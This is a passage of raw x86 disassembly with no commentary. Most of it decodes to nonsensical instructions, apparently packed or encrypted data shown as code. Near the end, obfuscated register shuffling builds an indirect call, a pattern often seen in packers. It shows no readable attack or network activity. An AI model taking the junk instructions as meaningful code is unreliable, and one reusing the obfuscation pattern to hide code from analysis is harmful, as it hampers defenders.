  41134f:	sub    eax,0x13a6f91f
  411354:	push   ds
  411355:	das    
  411356:	mov    edi,0xf6f827f9
  41135b:	mov    WORD PTR [esi+ebp*8+0x3],fs
  41135f:	(bad)  
  411360:	sti    
  411361:	mov    edi,0x6b6f2c82
  411366:	pop    ebx
  411367:	adc    DWORD PTR [ecx],eax
  411369:	addr16 leave 
  41136b:	out    dx,eax
  41136c:	aas    
  41136d:	lock sub BYTE PTR [ebx-0x2b],ah
  411371:	and    BYTE PTR [ecx],dl
  411373:	jge    0x411361
  411375:	sub    ecx,DWORD PTR [eax-0x6c]
  411378:	xor    DWORD PTR [esi+0x4],0x40
  41137c:	push   edi
  41137d:	adc    BYTE PTR [ebx-0x46d58ab7],bh
  411383:	ss out dx,eax
  411385:	pop    ecx
  411386:	sub    al,0x4a
  411388:	sahf   
  411389:	ret    
  41138a:	js     0x4113ab
  41138c:	in     eax,0x8d
  41138e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41138f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411390:	pop    edi
  411391:	jbe    0x41137d
  411393:	add    BYTE PTR [edi],dl
  411395:	rcr    DWORD PTR [edi],cl
  411397:	pusha  
  411398:	mov    ds:0x7a23054,al
  41139d:	fistp  WORD PTR [eax]
  41139f:	inc    edx
  4113a0:	pusha  
  4113a1:	sbb    al,0x8a
  4113a3:	loope  0x4113f7
  4113a5:	add    bh,al
  4113a7:	mov    al,ds:0xdfecf40c
  4113ac:	jge    0x411395
  4113ae:	push   ebx
  4113af:	retf   0xa65c
  4113b2:	mov    dl,BYTE PTR [eax]
  4113b4:	jg     0x4113a4
  4113b6:	in     eax,0xd0
  4113b8:	or     ch,BYTE PTR ds:0x91d45498
  4113be:	in     eax,0x58
  4113c0:	jmp    0x4113e9
  4113c2:	adc    al,BYTE PTR [eax]
  4113c4:	icebp  
  4113c5:	dec    edi
  4113c6:	xchg   ebx,ebp
  4113c8:	int3   
  4113c9:	les    edi,FWORD PTR [ebx]
  4113cb:	cwde   
  4113cc:	aad    0xe0
  4113ce:	loop   0x41142a
  4113d0:	push   0xf83c680e
  4113d5:	idiv   DWORD PTR [ebp+0x139dc6b6]
  4113db:	int    0x22
  4113dd:	mov    eax,ds:0x585aaeb9
  4113e2:	pop    ecx
  4113e3:	mov    al,BYTE PTR [edx-0x2c]
  4113e6:	pop    ebx
  4113e7:	mov    edx,0x5ac51e8e
  4113ec:	loop   0x41145b
  4113ee:	inc    esi
  4113ef:	loop   0x411404
  4113f1:	shl    edx,cl
  4113f3:	stos   DWORD PTR es:[edi],eax
  4113f4:	popa   
  4113f5:	and    ecx,DWORD PTR ds:0xfffc1a11
  4113fb:	push   eax
  4113fc:	sub    DWORD PTR [ebp+0x55ce4108],0xffffffce
  411403:	jmp    0x1117:0xe0ce1238
  41140a:	add    ebx,eax
  41140c:	or     eax,DWORD PTR [eax+0x63b64bcf]
  411412:	aaa    
  411413:	shl    DWORD PTR [eax-0x3132dc7e],1
  411419:	outs   dx,BYTE PTR ds:[esi]
  41141a:	mul    BYTE PTR [esi+0x48b638e8]
  411420:	clc    
  411421:	aaa    
  411422:	add    ecx,DWORD PTR [ecx]
  411424:	mov    ecx,0xd1da82bc
  411429:	outs   dx,DWORD PTR ds:[esi]
  41142a:	xor    BYTE PTR [eax],0xb3
  41142d:	(bad)  
  41142e:	pop    ecx
  41142f:	outs   dx,BYTE PTR ds:[esi]
  411430:	add    BYTE PTR [ebx+0x46],bh
  411433:	mov    ecx,DWORD PTR [edx]
  411435:	ds shr ah,cl
  411438:	push   ss
  411439:	xor    BYTE PTR [ecx],al
  41143b:	push   ebp
  41143c:	mov    bh,BYTE PTR [eax+0x2e]
  41143f:	sbb    DWORD PTR [ebp-0x1aac6568],0x23
  411446:	jecxz  0x411406
  411448:	loop   0x4114c7
  41144a:	lea    ebp,[ecx+0x1]
  41144d:	pop    eax
  41144e:	xor    ecx,edi
  411450:	and    DWORD PTR [esi+0x3d39e8c],ecx
  411456:	cs je  0x41144f
  411459:	out    dx,al
  41145a:	adc    dh,dl
  41145c:	pop    esp
  41145d:	fcomi  st,st(7)
  41145f:	mov    al,0x4f
  411461:	fsub   st,st(4)
  411463:	mov    BYTE PTR [edi],dl
  411465:	leave  
  411466:	sub    BYTE PTR [eax-0x771266f1],bl
  41146c:	mov    ds:0x9336a4af,eax
  411471:	xchg   edi,eax
  411472:	push   ds
  411473:	or     eax,0xdea9f160
  411478:	dec    edx
  411479:	mov    ah,0x5d
  41147b:	or     eax,DWORD PTR [ebp-0x36]
  41147e:	adc    ebx,ebp
  411480:	jl     0x411448
  411482:	fadd   DWORD PTR ds:0xeb7c23ad
  411488:	mov    al,0xcf
  41148a:	xor    BYTE PTR [eax+edi*8+0x47890c0e],ch
  411491:	nop
  411492:	imul   ebx,DWORD PTR [ecx],0x5bcd7bca
  411498:	inc    ebp
  411499:	pop    esi
  41149a:	test   DWORD PTR [edx],ebp
  41149c:	scas   al,BYTE PTR es:[edi]
  41149d:	mov    ebp,0xc0db78b0
  4114a2:	rcr    BYTE PTR [edx],1
  4114a4:	push   bx
  4114a6:	ins    DWORD PTR es:[edi],dx
  4114a7:	sbb    eax,0x29f48fb0
  4114ac:	das    
  4114ad:	jecxz  0x41146d
  4114af:	or     bl,BYTE PTR [edi]
  4114b1:	fcom   DWORD PTR [eax]
  4114b3:	sub    DWORD PTR [edi],0x6a771c56
  4114b9:	cmp    bh,BYTE PTR es:[ebp+0xc92861e]
  4114c0:	stos   DWORD PTR es:[edi],eax
  4114c1:	xchg   ebx,eax
  4114c2:	(bad)  ds:0x4a4ea5cf
  4114c8:	lods   al,BYTE PTR ds:[esi]
  4114c9:	les    ebx,FWORD PTR [eax-0x6ee72fbe]
  4114cf:	pop    esp
  4114d0:	xor    ebp,eax
  4114d2:	aad    0xc8
  4114d4:	add    eax,0x86416fc2
  4114d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114da:	pop    edi
  4114db:	rol    BYTE PTR [eax],0xa3
  4114de:	pop    ebp
  4114df:	push   ecx
  4114e0:	push   edx
  4114e1:	cli    
  4114e2:	push   0x23
  4114e4:	test   DWORD PTR fs:[edi+0x28a954f4],esi
  4114eb:	adc    al,0x89
  4114ed:	(bad)  
  4114ef:	nop
  4114f0:	neg    DWORD PTR [ebx+esi*2+0x17]
  4114f4:	cwde   
  4114f5:	test   BYTE PTR [ecx-0x4a2f9aa9],0xde
  4114fc:	or     BYTE PTR [ebp-0x16],ch
  4114ff:	pop    eax
  411500:	arpl   sp,si
  411502:	add    eax,DWORD PTR [ecx+0x37b77d45]
  411508:	ret    0x41f
  41150b:	adc    al,0x8a
  41150d:	jmp    0x3fe0:0x6e243ed2
  411514:	dec    ebx
  411515:	in     al,dx
  411516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411517:	lock xchg edx,eax
  411519:	addr16 pop es
  41151b:	rol    bl,cl
  41151d:	les    ebx,FWORD PTR [eax+eax*8]
  411520:	js     0x4114fc
  411522:	sub    al,0x89
  411524:	test   eax,0x1b10a5e6
  411529:	sub    BYTE PTR [eax+0x2295bb13],cl
  41152f:	(bad)  
  411530:	int    0xf
  411532:	cmp    eax,0x7beebada
  411537:	out    0xb1,al
  411539:	sahf   
  41153a:	enter  0xeef4,0xed
  41153e:	out    0x5b,eax
  411540:	pop    esi
  411541:	mov    BYTE PTR [eax-0x32],ah
  411544:	cmp    BYTE PTR [eax+0x6e],bl
  411547:	lock jg 0x411519
  41154a:	xchg   edi,eax
  41154b:	xor    eax,0xa6ecca78
  411550:	pop    edi
  411551:	mov    dl,0xee
  411553:	or     DWORD PTR [edx+eax*1-0x6a],ebp
  411557:	pop    es
  411558:	pop    ebp
  411559:	and    BYTE PTR [edx+0x3860fa5a],bl
  41155f:	inc    ebp
  411560:	mov    esi,esi
  411562:	mov    ebx,0x8f643de7
  411567:	xor    DWORD PTR [edx],esi
  411569:	adc    DWORD PTR [ebx],edi
  41156b:	cmc    
  41156c:	pop    esp
  41156d:	jl     0x411589
  41156f:	mov    esp,0xa07eafb
  411574:	dec    esi
  411575:	ret    
  411576:	jae    0x4115d0
  411578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411579:	popa   
  41157a:	or     BYTE PTR [edi],dh
  41157c:	add    al,ch
  41157e:	out    dx,al
  41157f:	cmp    eax,0xca497738
  411584:	sar    BYTE PTR [ecx],0x6f
  411587:	(bad)  
  411588:	jecxz  0x41156b
  41158a:	lock adc ebx,DWORD PTR [edx+ebp*2+0x72]
  41158f:	mov    ebp,0x42a6191f
  411594:	packssdw mm3,QWORD PTR [ebx-0x64]
  411598:	sbb    ah,BYTE PTR [ebx]
  41159a:	scas   eax,DWORD PTR es:[edi]
  41159b:	das    
  41159c:	push   esp
  41159d:	call   0x12f5430b
  4115a2:	inc    ebp
  4115a3:	xchg   ebx,eax
  4115a4:	push   edx
  4115a5:	dec    esi
  4115a6:	in     eax,0xf4
  4115a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115a9:	stc    
  4115aa:	enter  0x8da3,0x55
  4115ae:	gs mov eax,0x352cc2e9
  4115b4:	mov    bh,0x57
  4115b6:	xchg   ebp,eax
  4115b7:	fnsave [edi]
  4115b9:	cmp    DWORD PTR [edi+0x4947ade4],0x70012cab
  4115c3:	fnstsw WORD PTR [edi+0x3b]
  4115c6:	cmp    DWORD PTR [ebp-0x35afd5a5],edi
  4115cc:	push   ebx
  4115cd:	repnz mov eax,ds:0xf109ea0d
  4115d3:	and    eax,0xc92bf34
  4115d8:	jo     0x4115af
  4115da:	hlt    
  4115db:	add    dl,BYTE PTR [ecx+0x3b76da5c]
  4115e1:	jmp    0x3d560d29
  4115e6:	aaa    
  4115e7:	dec    esp
  4115e8:	(bad)  
  4115e9:	jp     0x4115dc
  4115eb:	or     al,BYTE PTR [ebp-0x50]
  4115ee:	add    BYTE PTR [esi],ah
  4115f0:	mov    esp,0x1c9d1037
  4115f5:	inc    ebx
  4115f6:	mov    ch,ah
  4115f8:	or     ecx,DWORD PTR [edi]
  4115fa:	(bad)  
  4115fc:	retf   0x47e0
  4115ff:	call   0x9e17c5c8
  411604:	cdq    
  411605:	in     eax,0x59
  411607:	mov    ebx,0x800030de
  41160c:	into   
  41160d:	add    al,0x63
  41160f:	lods   al,BYTE PTR ds:[esi]
  411610:	(bad)  
  411612:	mov    al,BYTE PTR [ebx]
  411614:	fisubr WORD PTR [esi+0x63]
  411617:	mov    ebp,0x4b45f46f
  41161c:	arpl   WORD PTR ds:0xdad00a10,di
  411622:	mov    ebx,DWORD PTR [ecx+eax*8+0x15869e7]
  411629:	cmp    ax,0xf82f
  41162d:	js     0x4115e5
  41162f:	jmp    0x411679
  411631:	test   bh,0x3d
  411634:	jb     0x4116a4
  411636:	push   esi
  411637:	test   ah,ch
  411639:	inc    ecx
  41163a:	inc    eax
  41163c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41163d:	icebp  
  41163e:	xchg   esi,eax
  41163f:	lahf   
  411640:	lods   al,BYTE PTR ds:[esi]
  411641:	mov    bl,0x73
  411643:	in     al,0x76
  411645:	dec    ebp
  411646:	sub    BYTE PTR [edi+0x5fe3c985],0x6b
  41164d:	xor    al,0x29
  41164f:	xchg   edx,eax
  411650:	js     0x411671
  411652:	jns    0x411608
  411654:	gs inc edi
  411656:	call   0xba8e:0x795ec961
  41165d:	push   edi
  41165e:	out    0x26,al
  411660:	pop    esp
  411661:	and    ah,0xf2
  411664:	daa    
  411665:	cmp    eax,0x9b0f24f2
  41166a:	iret   
  41166b:	(bad)  
  41166c:	pop    ecx
  41166d:	cmp    ah,BYTE PTR [edx+0x39]
  411670:	ja     0x4116cb
  411672:	outs   dx,DWORD PTR ds:[esi]
  411673:	xor    ebp,DWORD PTR [edi+0x2071271d]
  411679:	push   cs
  41167a:	pop    ebp
  41167b:	cmp    DWORD PTR [ecx+esi*2+0x39cf9627],ecx
  411682:	dec    edx
  411683:	xchg   ecx,eax
  411684:	dec    eax
  411685:	repz pop edi
  411687:	lods   eax,DWORD PTR ds:[esi]
  411688:	repz cmp al,bh
  41168b:	fistp  WORD PTR ds:0x83312969
  411691:	cmp    cl,BYTE PTR [edi-0x54dad613]
  411697:	clc    
  411698:	cmp    DWORD PTR [edi],ebx
  41169a:	ins    BYTE PTR es:[edi],dx
  41169b:	nop
  41169c:	scas   eax,DWORD PTR es:[edi]
  41169d:	inc    esp
  41169e:	xor    BYTE PTR [edx],bh
  4116a0:	jp     0x411635
  4116a2:	pop    ds
  4116a3:	xchg   DWORD PTR [ebx+0x9e31d85],edi
  4116a9:	retf   
  4116aa:	mov    cs,WORD PTR ds:0xb84a6bb6
  4116b0:	adc    cl,BYTE PTR [edi+0x7]
  4116b3:	test   DWORD PTR [ebp+eiz*2-0x1ee41a7f],0x5d5959ef
  4116be:	dec    eax
  4116bf:	gs jae 0x41170d
  4116c2:	ret    0x84af
  4116c5:	mov    bl,0x6d
  4116c7:	repz jo 0x411743
  4116ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116cb:	daa    
  4116cc:	sbb    cl,cl
  4116ce:	popf   
  4116cf:	mov    ebp,0xa334f5a1
  4116d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116d5:	in     eax,dx
  4116d6:	fwait
  4116d7:	jl     0x411725
  4116d9:	fcom   DWORD PTR [eax+0x22e33856]
  4116df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116e0:	mov    esp,0xd8872832
  4116e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116e6:	sbb    eax,0x5c520c48
  4116eb:	test   esi,ebp
  4116ed:	or     esi,edx
  4116ef:	xchg   esp,eax
  4116f0:	cmp    eax,0x1398e80d
  4116f5:	add    DWORD PTR [eax+0x3334a9a1],ebx
  4116fb:	push   eax
  4116fc:	or     ecx,ebx
  4116fe:	loope  0x411693
  411700:	data16 clc 
  411702:	xchg   ebx,eax
  411703:	pop    ss
  411704:	jbe    0x4116bd
  411706:	repnz retf 
  411708:	in     eax,0xa5
  41170a:	das    
  41170b:	push   ecx
  41170c:	les    ebx,FWORD PTR [edi+0x6e24101f]
  411712:	cs cli 
  411714:	and    eax,0xc1beae
  411719:	add    eax,0x52b2afcc
  41171e:	inc    ecx
  41171f:	fwait
  411720:	dec    edx
  411721:	in     al,0x5b
  411723:	in     al,0x85
  411725:	dec    ecx
  411726:	retf   0xfa71
  411729:	mov    ch,0x16
  41172b:	jnp    0x4116ff
  41172d:	loop   0x4116fe
  41172f:	hlt    
  411730:	sbb    ebx,0xffffffa4
  411733:	js     0x41170c
  411735:	pop    ss
  411736:	add    eax,0x4b7602a3
  41173b:	arpl   WORD PTR [edx+0x583e68c1],ax
  411741:	fs add eax,0x562847cc
  411747:	icebp  
  411748:	push   cs
  411749:	(bad)  
  41174a:	in     eax,0x7
  41174c:	and    DWORD PTR [ecx],edi
  41174e:	mov    ds:0x95b85340,al
  411753:	ins    BYTE PTR es:[edi],dx
  411754:	xchg   ebp,eax
  411755:	iret   
  411756:	sysexit 
  411758:	cmp    dl,cl
  41175a:	stos   DWORD PTR es:[edi],eax
  41175b:	mov    al,0x54
  41175d:	add    eax,0xaf63fdb3
  411762:	lea    edx,[edi+0x37f2c6e]
  411768:	std    
  411769:	popf   
  41176a:	push   esi
  41176b:	mov    ds:0x3aa7a2c3,al
  411770:	(bad)  [esi+0x44]
  411773:	and    esp,DWORD PTR [ecx]
  411775:	jno    0x4117d4
  411777:	rcl    DWORD PTR [eax+0x6a],cl
  41177a:	dec    edi
  41177b:	sbb    BYTE PTR gs:[eax-0x1],cl
  41177f:	mov    WORD PTR [edx-0x7a46d592],?
  411785:	sub    edx,DWORD PTR [edx+0x64e022af]
  41178b:	retf   
  41178c:	adc    BYTE PTR [eax+0x1fc22065],bl
  411792:	or     BYTE PTR [ebx-0x3e],0xdd
  411796:	les    edi,FWORD PTR [ebx]
  411798:	push   cs
  411799:	fs dec esp
  41179b:	test   BYTE PTR [eax-0x11687237],dh
  4117a1:	mov    BYTE PTR [ebx],cl
  4117a3:	lds    eax,FWORD PTR [esi]
  4117a5:	push   ecx
  4117a6:	mov    al,0xa
  4117a8:	mov    DWORD PTR [edx],edi
  4117aa:	adc    al,0x97
  4117ac:	pop    esp
  4117ad:	cmp    al,BYTE PTR [ecx]
  4117af:	das    
  4117b0:	imul   ecx,esi,0xffffffad
  4117b3:	mov    bl,0xd8
  4117b5:	gs scas eax,DWORD PTR es:[edi]
  4117b7:	push   edi
  4117b8:	ret    
  4117b9:	pop    ds
  4117ba:	scas   eax,DWORD PTR es:[edi]
  4117bb:	outs   dx,DWORD PTR ds:[esi]
  4117bc:	sbb    al,BYTE PTR [ecx+0x1328ace6]
  4117c2:	xchg   ecx,eax
  4117c3:	xchg   esp,eax
  4117c4:	imul   ecx,DWORD PTR [edx+0x6],0x59b71b41
  4117cb:	aam    0xea
  4117cd:	or     BYTE PTR [ecx-0x28df272a],dh
  4117d3:	xchg   esi,eax
  4117d4:	or     eax,0x3fd8c736
  4117d9:	imul   edx,eax,0xffffff92
  4117dc:	xsha256 (bad)
  4117dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117de:	xchg   esi,eax
  4117df:	mov    eax,ds:0x38410069
  4117e4:	adc    cl,BYTE PTR [edx+0x5d]
  4117e7:	add    eax,ecx
  4117e9:	jb     0x411791
  4117eb:	jne    0x4117ef
  4117ed:	in     eax,0xcb
  4117ef:	push   edx
  4117f0:	rol    DWORD PTR [edi+0x14],cl
  4117f3:	mov    cl,BYTE PTR [edx-0x77]
  4117f6:	fwait
  4117f7:	inc    ecx
  4117f8:	int3   
  4117f9:	dec    ebp
  4117fa:	fsub   DWORD PTR [ecx]
  4117fc:	test   ch,0x7b
  4117ff:	jo     0x4117e7
  411801:	out    0xbe,eax
  411803:	iret   
  411804:	push   0x7e5e40f2
  411809:	(bad)  [ebx]
  41180b:	icebp  
  41180c:	es enter 0x68c5,0xa3
  411811:	es dec eax
  411813:	sub    DWORD PTR [ebx+0x39f207fd],esi
  411819:	int    0x4a
  41181b:	xor    ebx,DWORD PTR [edx]
  41181d:	add    al,0x13
  41181f:	scas   eax,DWORD PTR es:[edi]
  411820:	mov    ah,0x0
  411822:	pop    esi
  411823:	jmp    0x959a:0x8d47fe45
  41182a:	push   0x53
  41182c:	pop    ss
  41182d:	mov    dh,0xa9
  41182f:	inc    ecx
  411830:	jecxz  0x4117f5
  411832:	adc    bl,BYTE PTR [ecx+eiz*2]
  411835:	xor    al,0x7a
  411837:	or     ebp,DWORD PTR es:[eax]
  41183a:	ins    BYTE PTR es:[edi],dx
  41183b:	push   ecx
  41183c:	in     eax,0x6a
  41183e:	mov    esi,0x497046c0
  411843:	cmp    BYTE PTR [ebp-0x7c],bl
  411846:	shl    BYTE PTR [esi],0xe0
  411849:	and    eax,0x8ee75a0
  41184e:	mul    BYTE PTR [ecx-0x3d7fff06]
  411854:	(bad)  
  411855:	xor    bh,dh
  411857:	fnstsw WORD PTR [ebx+0x734637c1]
  41185d:	nop
  41185e:	retf   
  41185f:	jae    0x411888
  411861:	xchg   esp,eax
  411862:	push   esi
  411863:	shl    BYTE PTR [edx+0x19885798],0x66
  41186a:	dec    edi
  41186b:	stc    
  41186c:	mov    ebx,0xc116c0ed
  411871:	popf   
  411872:	add    bl,dl
  411874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411875:	sbb    ah,ch
  411877:	pop    eax
  411878:	(bad)  
  411879:	neg    BYTE PTR [esi]
  41187b:	ins    DWORD PTR es:[edi],dx
  41187c:	(bad)  
  41187d:	lock add DWORD PTR [ecx-0x46aca1f2],0xffffffb5
  411885:	dec    edx
  411886:	int    0x2
  411888:	nop
  411889:	sub    ebp,DWORD PTR [eax+0x64730641]
  41188f:	mov    ds:0x376afb6,eax
  411894:	mov    ch,0xd9
  411896:	enter  0x68af,0x1d
  41189a:	mov    ds:0xc1bf7a85,al
  41189f:	inc    edi
  4118a0:	lahf   
  4118a1:	out    dx,al
  4118a2:	fdivrp st(1),st
  4118a4:	inc    ebp
  4118a5:	cmc    
  4118a6:	neg    ebp
  4118a8:	aam    0xc0
  4118aa:	sbb    al,0x70
  4118ac:	sbb    edx,DWORD PTR [eax+0x7b]
  4118af:	out    0xdf,al
  4118b1:	imul   edi,DWORD PTR [esp+edi*2],0x43
  4118b5:	ja     0x411906
  4118b7:	xor    eax,0x7014bed5
  4118bc:	imul   edi,DWORD PTR [eax],0xffffffb1
  4118bf:	sub    cl,BYTE PTR [edi]
  4118c1:	xchg   ebx,eax
  4118c2:	(bad)  
  4118c3:	sub    eax,0x9296b8ba
  4118c8:	mov    ds:0xfa539b2a,eax
  4118cd:	xchg   esi,eax
  4118ce:	bound  esi,QWORD PTR [ecx-0x57]
  4118d1:	retf   0x3a37
  4118d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118d5:	dec    ebp
  4118d6:	in     al,0x7f
  4118d8:	int3   
  4118d9:	lds    edi,FWORD PTR [edx]
  4118db:	mov    bh,0x7d
  4118dd:	sbb    al,0xc3
  4118df:	mov    bh,0xe6
  4118e1:	rcl    BYTE PTR [edi-0x5f522e56],0x3e
  4118e8:	call   0xf99a:0xd9cf9ebd
  4118ef:	(bad)  
  4118f0:	push   ecx
  4118f1:	dec    edi
  4118f2:	mov    ds:0x6f2dbb6d,eax
  4118f7:	cmp    al,ah
  4118f9:	mov    WORD PTR ds:0x44810aba,?
  4118ff:	push   0xffffffb1
  411901:	sub    eax,0x6c18d5b5
  411906:	repnz push ds
  411908:	nop
  411909:	dec    eax
  41190a:	dec    ebx
  41190b:	sub    DWORD PTR [ebx+0x7d],esi
  41190e:	ret    
  41190f:	sub    DWORD PTR [eax-0x76baf233],eax
  411915:	ret    
  411916:	repz shl DWORD PTR [eax-0x67],1
  41191a:	fs push ebp
  41191c:	sub    BYTE PTR [ebp+edi*2-0x1c2112e6],ch
  411923:	out    0x4a,al
  411925:	in     al,0x91
  411927:	out    dx,eax
  411928:	into   
  411929:	and    al,BYTE PTR [eax+0xd]
  41192c:	ret    
  41192d:	jl     0x41194b
  41192f:	aam    0xb7
  411931:	push   cs
  411932:	retf   0x2d6
  411935:	data16 fbld TBYTE PTR [ecx-0x80]
  411939:	jge    0x411987
  41193b:	call   0x3316cebd
  411940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411941:	pop    esp
  411942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411943:	mov    WORD PTR [ebp+0x68],?
  411946:	in     al,dx
  411947:	aam    0xc9
  411949:	test   al,0xf5
  41194b:	add    edx,DWORD PTR [edi+0x1031f332]
  411951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411952:	or     eax,0x77095cc8
  411957:	std    
  411958:	mov    esi,0xa3764a24
  41195d:	mov    cl,0x40
  41195f:	fstp   QWORD PTR [ebp+0x1db48979]
  411965:	das    
  411966:	xor    ch,al
  411968:	shl    DWORD PTR [ebx],cl
  41196a:	ins    DWORD PTR es:[edi],dx
  41196b:	loope  0x4119b7
  41196d:	js     0x4119e9
  41196f:	loop   0x411978
  411971:	jp     0x41191c
  411973:	add    DWORD PTR cs:[edx],0xffffff99
  411977:	xor    BYTE PTR [edi+0x62b5da22],dl
  41197d:	jnp    0x4119b6
  41197f:	adc    DWORD PTR [edi-0x4fc32f49],edi
  411985:	lock lods al,BYTE PTR cs:[esi]
  411988:	ins    BYTE PTR es:[edi],dx
  411989:	js     0x4119c9
  41198b:	or     DWORD PTR [edi],esi
  41198d:	adc    cl,bl
  41198f:	neg    DWORD PTR [eax+0x2575c3a4]
  411995:	in     eax,0xfa
  411997:	arpl   WORD PTR [edx],ax
  411999:	int3   
  41199a:	jmp    0x411932
  41199c:	jmp    0xa1da9e75
  4119a1:	push   es
  4119a2:	sub    BYTE PTR [ecx+ecx*4-0x13167ad9],dh
  4119a9:	pusha  
  4119aa:	int    0x9f
  4119ac:	pushf  
  4119ad:	lods   al,BYTE PTR ds:[esi]
  4119ae:	push   ebp
  4119af:	adc    al,BYTE PTR [esi-0x6144395]
  4119b5:	xor    eax,DWORD PTR ds:0xb3385263
  4119bb:	in     eax,0xea
  4119bd:	aas    
  4119be:	inc    eax
  4119bf:	jne    0x41194c
  4119c1:	call   0x396220ac
  4119c6:	repnz loop 0x4119d7
  4119c9:	or     BYTE PTR [esi-0x64],0x71
  4119cd:	mov    dl,ch
  4119cf:	xor    DWORD PTR [eax],eax
  4119d1:	jl     0x4119c2
  4119d3:	xchg   edi,edx
  4119d5:	sbb    BYTE PTR [edx-0x5f7eebd2],ah
  4119db:	cmc    
  4119dc:	xor    ecx,DWORD PTR [esi+0x650066ae]
  4119e2:	adc    al,0xe4
  4119e4:	repnz mov esi,0x5025c596
  4119ea:	out    dx,eax
  4119eb:	in     eax,0x4c
  4119ed:	xchg   esi,eax
  4119ee:	std    
  4119ef:	mov    esp,0x14d58404
  4119f4:	mov    ecx,0x9f1278ce
  4119f9:	imul   edi,DWORD PTR [ebx-0x459bab48],0xfffffff9
  411a00:	rcl    ch,1
  411a02:	mov    ebx,0x5f9f5d38
  411a07:	pop    esp
  411a08:	lea    eax,[edi]
  411a0a:	cwde   
  411a0b:	outs   dx,BYTE PTR ds:[esi]
  411a0c:	es jl  0x411a0f
  411a0f:	and    al,0x1
  411a12:	jnp    0x4119f8
  411a14:	xor    ebp,DWORD PTR fs:[edi-0x14]
  411a18:	mov    ah,0xea
  411a1a:	mov    al,0x8
  411a1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a1d:	ins    DWORD PTR es:[edi],dx
  411a1e:	pop    es
  411a1f:	jle    0x411a8d
  411a21:	mov    edx,ebp
  411a23:	ss xor ecx,esi
  411a26:	add    ecx,edi
  411a28:	xor    edx,edx
  411a2a:	div    ecx
  411a2c:	mov    ecx,DWORD PTR [ebp-0x4]
  411a2f:	xor    ecx,esi
  411a31:	lea    eax,[ecx+eax*1+0x3272f6]
  411a38:	mov    ecx,DWORD PTR [ebp+0x8]
  411a3b:	mov    edx,DWORD PTR [ebp-0x20]
  411a3e:	mov    DWORD PTR [edx+ecx*4],eax
  411a41:	mov    eax,DWORD PTR [ebp-0xc]
  411a44:	mov    ecx,DWORD PTR [ebp+0x8]
  411a47:	xor    eax,esi
  411a49:	lea    eax,[eax+ecx*1+0x3272f6]
  411a50:	mov    DWORD PTR [ebp+0x8],eax
  411a53:	mov    eax,DWORD PTR [ebp-0xc]
  411a56:	mov    ecx,DWORD PTR [ebp+0x14]
  411a59:	xor    eax,esi
  411a5b:	add    eax,edi
  411a5d:	imul   eax,DWORD PTR [ecx]
  411a60:	mov    ecx,DWORD PTR [ebp-0x4]
  411a63:	mov    edx,DWORD PTR [ebp+0x8]
  411a66:	xor    ecx,esi
  411a68:	lea    ecx,[ecx+edx*1+0x3272f6]
  411a6f:	cmp    ecx,eax
  411a71:	jne    0x40f668
  411a77:	mov    eax,DWORD PTR [ebp-0x4]
  411a7a:	xor    eax,esi
  411a7c:	add    eax,edi
  411a7e:	mov    DWORD PTR [ebp-0x10],eax
  411a81:	mov    ebx,0x65655
  411a86:	add    ebx,0x3234
  411a8c:	xchg   ebx,esi
  411a8e:	xor    ebx,ebx
  411a90:	push   esi
  411a91:	mov    esi,ebx
  411a93:	pop    ebx
  411a94:	mov    edx,esi
  411a96:	add    ebx,0x1002
  411a9c:	lea    eax,[ebp-0x18]
  411a9f:	add    edx,eax
  411aa1:	add    edx,0x5
  411aa4:	push   edx
  411aa5:	inc    esi
  411aa6:	pop    ecx
  411aa7:	dec    ecx
  411aa8:	xchg   ecx,eax
  411aa9:	dec    eax
  411aaa:	xchg   ecx,eax
  411aab:	dec    ecx
  411aac:	xchg   ecx,edx
  411aae:	dec    edx
  411aaf:	push   edx
  411ab0:	mov    edx,ebx
  411ab2:	pop    ebx
  411ab3:	dec    ebx
  411ab4:	call   DWORD PTR [ebx]
  411ab6:	cmp    DWORD PTR [ebp+0x10],esi
  411ab9:	je     0x411ada
  411abf:	xchg   edx,eax
  411ac0:	push   0xc
  411ac2:	pop    ecx
  411ac3:	dec    ecx
  411ac4:	push   0x3
  411ac6:	pop    ebx
  411ac7:	inc    ebx
  411ac8:	xchg   ebx,ecx
  411aca:	inc    ecx
  411acb:	sub    ebx,ecx
  411acd:	xchg   ebx,ecx
  411acf:	dec    ecx
  411ad0:	dec    ecx
  411ad1:	mov    eax,DWORD PTR [ebp-0x1c]
  411ad4:	imul   eax,ecx
  411ad7:	add    esp,eax
  411ad9:	xchg   edx,eax
  411ada:	push   eax
  411adb:	xor    ebx,ebx
  411add:	mov    edx,esp
  411adf:	dec    edx
  411ae0:	inc    ebx
  411ae1:	add    ebx,DWORD PTR [edx+ebx*1]
  411ae4:	dec    ebx
  411ae5:	xor    edx,edx
  411ae7:	add    DWORD PTR [ebp-0x10],ebx
  411aea:	pop    ebx
  411aeb:	mov    eax,DWORD PTR [ebp-0x10]
  411aee:	pop    edi
  411aef:	pop    esi
  411af0:	pop    ebx
  411af1:	leave  
  411af2:	ret    0x10
  411af5:	push   ebp
  411af6:	mov    ebp,esp
  411af8:	push   ecx
  411af9:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  411b00:	mov    eax,DWORD PTR [ebp-0x4]
  411b03:	sbb    DWORD PTR ds:0x428ea7,ebx
  411b09:	mov    edx,DWORD PTR [ebp+0x10]
  411b0c:	mov    ecx,0x75108af
  411b11:	sbb    DWORD PTR ds:0x428eaf,0x428e4b
  411b1b:	xor    eax,ecx
